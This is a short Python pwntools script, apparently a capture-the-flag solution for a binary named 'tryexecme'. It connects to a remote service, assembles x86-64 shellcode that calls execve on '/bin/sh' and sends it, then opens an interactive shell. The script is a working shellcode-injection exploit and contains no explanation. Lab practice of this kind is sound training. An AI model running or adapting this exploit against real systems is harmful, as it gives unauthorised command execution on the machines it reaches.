from pwn import *

context.arch = "amd64"
context.os = "linux"

# p = process("./tryexecme")
p = remote("10.10.104.183", 9005)

shellcode = '''
    mov rdi, 0x0068732f6e69622f
    
    push rdi
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx

    mov rax, 59
    syscall
'''

sc = asm(shellcode)

p.sendlineafter(b":", sc)
p.interactive()
